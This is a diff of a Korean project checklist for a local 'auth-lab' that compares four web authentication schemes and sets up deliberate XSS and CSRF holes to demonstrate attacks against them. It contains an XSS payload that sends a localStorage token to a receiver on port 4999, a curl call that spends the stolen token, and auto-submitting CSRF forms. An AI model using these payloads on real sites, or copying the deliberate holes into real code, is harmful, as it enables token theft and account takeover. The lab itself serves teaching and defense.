@@ -8,26 +8,31 @@
 ## Phase 0: 프로젝트 초기 세팅
 
 ### 0-1. 디렉토리 구조 생성
+
 - [x] `auth-lab/client/` — Next.js 14 프로젝트
 - [x] `auth-lab/server/` — NestJS 프로젝트
 - [x] `auth-lab/hacker/` — 공격용 정적 파일
 - [x] `auth-lab/docker/` — Docker Compose 설정
 
 ### 0-2. Docker 환경
+
 - [x] `docker-compose.yml` 작성 (PostgreSQL 15 + pgAdmin)
 - [x] `.env.example` 작성
 
 ### 0-3. NestJS 프로젝트 생성
+
 - [x] `nest new server --package-manager npm`
 - [x] 패키지 설치 (typeorm, passport, jwt, session, cookie-parser, bcrypt 등)
 - [x] `.env` 파일 생성
 
 ### 0-4. Next.js 프로젝트 생성
+
 - [x] `create-next-app` (TypeScript + Tailwind + App Router)
 - [x] 패키지 설치 (axios, zustand, tanstack-query, zod, react-hook-form)
 - [x] root `.gitignore` 생성 (node_modules 차단)
 
 ### 0-5. Client 기반 인프라 구현 (SRP + Exception_Handling 컨벤션)
+
 - [x] `lib/http/publicApi.ts` — 로그인/refresh 전용 axios 인스턴스
 - [x] `lib/http/privateApi.ts` — AT 주입 + 401 refresh 인터셉터
 - [x] `components/common/error/ErrorBoundary.tsx` — [Global] 범용 클래스 boundary
@@ -45,34 +50,40 @@
 ## Phase 1: NestJS 서버 — DB 및 공통 모듈
 
 ### 1-1. TypeORM 설정
+
 - [x] `app.module.ts`에 TypeORM 연결 (host: localhost, port: 5433)
 - [x] `synchronize: true` (개발 환경)
 
 ### 1-2. User 엔티티 정의
+
 ```typescript
 @Entity()
 export class User {
-  @PrimaryGeneratedColumn('uuid') id: string;
-  @Column({ unique: true })       email: string;
-  @Column()                       password: string;  // bcrypt
-  @Column({ default: 0 })         points: number;
-  @Column({ type: 'enum', enum: Role, default: Role.USER }) role: Role;
-  @Column({ default: false })     isWithdrawn: boolean;
+  @PrimaryGeneratedColumn("uuid") id: string;
+  @Column({ unique: true }) email: string;
+  @Column() password: string; // bcrypt
+  @Column({ default: 0 }) points: number;
+  @Column({ type: "enum", enum: Role, default: Role.USER }) role: Role;
+  @Column({ default: false }) isWithdrawn: boolean;
 }
 ```
+
 - [x] `Role` enum: `USER | ADMIN`
 
 ### 1-3. Post 엔티티 정의
+
 - [x] `entities/post.entity.ts` — content 필터 없음 (XSS 취약점 의도적 설계)
 
 ### 1-4. Seed 데이터
+
 - [x] `SeedService` (OnModuleInit) — 서버 시작 시 자동 삽입
   - `victim@test.com` / `victim1234` / points: 1,000,000 ✅
   - `hacker@test.com` / `hacker1234` / points: 0 ✅
-  - `admin@test.com`  / `admin1234`  / points: 0 ✅
+  - `admin@test.com` / `admin1234` / points: 0 ✅
   - XSS 게시글: `<img onerror="fetch('http://localhost:4999/steal?t='+localStorage.getItem('at'))">` ✅
 
 ### 1-5. 공통 API 모듈
+
 - [x] `PostsModule` — `GET /api/posts`, `POST /api/posts`
 - [x] `PointsModule` — `POST /api/points/transfer` (V1 JWT Bearer 인증)
 - [x] `UsersModule` — `POST /api/user/update-password`, `GET /api/user/withdraw`, `GET /api/user/me`
@@ -88,20 +99,25 @@ export class User {
 ### 2-1. V1: JWT → Body 응답 (LocalStorage 방식)
 
 **서버 동작:**
+
 - [x] `POST /auth/v1/login` — `{ accessToken }` JSON 응답
 - [x] `GET /auth/v1/me` — Authorization Bearer 헤더 검증
 
 ```typescript
 // 응답 형태
-return { accessToken: this.jwtService.sign({ sub: user.id, email: user.email }) };
+return {
+  accessToken: this.jwtService.sign({ sub: user.id, email: user.email }),
+};
 ```
 
 **취약점 설계:**
+
 - [x] `POST /api/points/transfer` — Authorization 헤더 JWT로 인증 (훔친 토큰으로 호출 가능)
 
 ---
 
 ### 2-2. V2: express-session (Session Cookie 방식)
+
 - [x] `POST /auth/v2/login` — req.session.userId 저장
 - [x] `POST /auth/v2/logout` — session.destroy()
 - [x] `GET /auth/v2/me` — 세션 ID로 프로필 조회
@@ -110,6 +126,7 @@ return { accessToken: this.jwtService.sign({ sub: user.id, email: user.email }) 
 ---
 
 ### 2-3. V3: JWT → HttpOnly Cookie (SameSite=Lax)
+
 - [x] `POST /auth/v3/login` — `res.cookie('at', jwt, { httpOnly: true, sameSite: 'lax' })`
 - [x] `POST /auth/v3/logout` — clearCookie
 - [x] `GET /auth/v3/me` — 쿠키 JWT 검증
@@ -117,6 +134,7 @@ return { accessToken: this.jwtService.sign({ sub: user.id, email: user.email }) 
 ---
 
 ### 2-4. V4: Hybrid Refresh Token (안전한 방식)
+
 - [x] `POST /auth/v4/login` — AT(Body 15분) + RT(Cookie Strict 7일)
 - [x] `POST /auth/v4/refresh` — RT 검증 + RT Rotation
 - [x] `POST /auth/v4/logout` — RT 쿠키 삭제
@@ -127,12 +145,15 @@ return { accessToken: this.jwtService.sign({ sub: user.id, email: user.email }) 
 ## Phase 3: NestJS 서버 — 공격 대상 API 완성
 
 ### 3-1. 포인트 송금 (`POST /api/points/transfer`)
+
 - [x] V1 JWT Bearer 인증, 트랜잭션 처리, 잔액 부족 400
 
 ### 3-2. 비밀번호 변경 (`POST /api/user/update-password`)
+
 - [x] V2 세션 인증, oldPassword 확인 없음 (CSRF 취약)
 
 ### 3-3. 회원 탈퇴 (`GET /api/user/withdraw`)
+
 - [x] V3 HttpOnly 쿠키 JWT 인증, GET 방식 유지
 
 ---
@@ -140,6 +161,7 @@ return { accessToken: this.jwtService.sign({ sub: user.id, email: user.email }) 
 ## Phase 4: 공격 도구 (`hacker/` 디렉토리)
 
 ### 4-1. XSS 토큰 수신 서버
+
 - [ ] `hacker/xss-receiver.js` — Node.js HTTP 서버 (port 4999)
   ```javascript
   // GET /steal?t=... 로 토큰 수신
@@ -148,23 +170,32 @@ return { accessToken: this.jwtService.sign({ sub: user.id, email: user.email }) 
   ```
 
 ### 4-2. CSRF 공격 페이지 (2단계)
+
 - [ ] `hacker/csrf-stage2.html` — 비밀번호 변경 CSRF (port 5000에서 서빙)
   ```html
   <!-- 자동 제출 폼 -->
-  <form id="attack" action="http://localhost:4002/api/user/update-password" method="POST">
-    <input type="hidden" name="newPassword" value="hacker1234!">
+  <form
+    id="attack"
+    action="http://localhost:4002/api/user/update-password"
+    method="POST"
+  >
+    <input type="hidden" name="newPassword" value="hacker1234!" />
   </form>
-  <script>document.getElementById('attack').submit();</script>
+  <script>
+    document.getElementById("attack").submit();
+  </script>
   ```
 
 ### 4-3. GET CSRF 공격 시뮬레이터 (3단계)
+
 - [ ] `hacker/csrf-stage3.html` — 이미지 태그 공격 (port 5000에서 서빙)
   ```html
   <!-- 이미지 로딩 시 탈퇴 API 호출 -->
-  <img src="http://localhost:4003/api/user/withdraw" style="display:none">
+  <img src="http://localhost:4003/api/user/withdraw" style="display:none" />
   ```
 
 ### 4-4. Hacker 서버 정적 파일 서빙
+
 - [ ] `hacker/server.js` — express로 포트 5000에서 정적 파일 서빙
 
 ---
@@ -172,6 +203,7 @@ return { accessToken: this.jwtService.sign({ sub: user.id, email: user.email }) 
 ## Phase 5: Next.js 클라이언트
 
 ### 5-1. 앱 기본 구조
+
 ```
 client/app/
 ├── layout.tsx              ← 최상위 레이아웃 (인증 탭 포함)
@@ -184,6 +216,7 @@ client/app/
 ```
 
 ### 5-2. 인증 방식 탭 전환
+
 - [ ] `AuthModeStore (Zustand)` — 선택된 인증 방식 저장 (`v1` | `v2` | `v3` | `v4`)
 - [ ] Axios 인터셉터: 선택된 방식에 따라 baseURL 및 Authorization 헤더 스위칭
   ```typescript
@@ -194,19 +227,23 @@ client/app/
   ```
 
 ### 5-3. V1: LocalStorage 인증 흐름
+
 - [ ] 로그인 후 `localStorage.setItem('at', accessToken)`
 - [ ] 모든 API 요청: `Authorization: Bearer ${localStorage.getItem('at')}`
 - [ ] 대시보드에 현재 저장된 토큰 표시 (공격 시각화용)
 
 ### 5-4. V2: 세션 쿠키 흐름
+
 - [ ] 로그인 요청: `axios.post('/auth/v2/login', { ... }, { withCredentials: true })`
 - [ ] 별도 토큰 저장 없음 — 쿠키 자동 관리
 
 ### 5-5. V3: HttpOnly 쿠키 흐름
+
 - [ ] V2와 동일 (`withCredentials: true`)
 - [ ] 개발자 도구 → Application → Cookies에서 `at` 쿠키 확인 (HttpOnly라 JS 접근 불가)
 
 ### 5-6. V4: Hybrid Refresh 흐름
+
 - [ ] `AuthStore (Zustand)`: `accessToken` 메모리 변수
 - [ ] 로그인 후: `setAccessToken(res.data.accessToken)`
 - [ ] `useRefresh` 훅: 앱 초기화 시 `POST /auth/v4/refresh` 호출해 AT 복구
@@ -214,11 +251,14 @@ client/app/
 - [ ] 401 응답 시 자동 Refresh → 재시도 (Silent Refresh)
 
 ### 5-7. 게시판 페이지 (XSS 체험용)
+
 - [ ] 게시글 목록을 렌더링할 때 `dangerouslySetInnerHTML` 사용 (취약 버전)
 - [ ] 안전 버전: `DOMPurify` 적용 후 비교
 
 ### 5-8. 공격 시뮬레이션 패널 (`/attack`)
+
 각 단계별 공격 방법을 UI로 제공:
+
 - [ ] **1단계**: "XSS 공격 실행" 버튼 → localStorage 읽기 스크립트 실행 + 결과 표시
 - [ ] **2단계**: "CSRF 공격 페이지로 이동" 버튼 → localhost:5000/csrf-stage2.html
 - [ ] **3단계**: "악성 게시글 작성" → img 태그 포함 게시글 등록
@@ -229,14 +269,21 @@ client/app/
 ## Phase 6: 통합 테스트 시나리오
 
 ### 시나리오 A: 1단계 공격 전체 흐름
+
 ```
 1. victim으로 V1 로그인 → localStorage에 AT 저장 확인
+2. XSS 게시글 등록
+`<p>xss공격이다</p>
+<img src=x onerror="fetch('http://localhost:4999/steal?t='+localStorage.getItem('at'))">`
 2. XSS 게시글 클릭 → hacker 서버(4999)에 토큰 수신 확인
 3. 새 시크릿 창에서 localStorage에 훔친 토큰 직접 주입
 4. /api/points/transfer 호출 → victim 잔액 0, hacker 잔액 1,000,000 확인
+curl -X POST http://localhost:4001/api/points/transfer -H "Authorization: Bearer 훔친토큰" -H "Content-Type: application/json" -d '{"toEmail":"hacker@test.com","amount":10000}'
+{"message":"10,000포인트 송금 완료","from":{"email":"victim@test.com","points":989000},"to":{"email":"hacker@test.com","points":10000}}%
 ```
 
 ### 시나리오 B: 2단계 공격 전체 흐름
+
 ```
 1. victim으로 V2 로그인 (세션 쿠키 발급)
 2. 같은 브라우저에서 localhost:5000/csrf-stage2.html 접속
@@ -246,6 +293,7 @@ client/app/
 ```
 
 ### 시나리오 C: 3단계 공격 전체 흐름
+
 ```
 1. victim으로 V3 로그인 (HttpOnly 쿠키 발급)
 2. 공격자가 악성 게시글 작성 (<img src="http://localhost:4003/api/user/withdraw">)
@@ -255,6 +303,7 @@ client/app/
 ```
 
 ### 시나리오 D: 4단계 방어 확인
+
 ```
 1. victim으로 V4 로그인
 2. 1단계 공격: localStorage 확인 → 비어있음
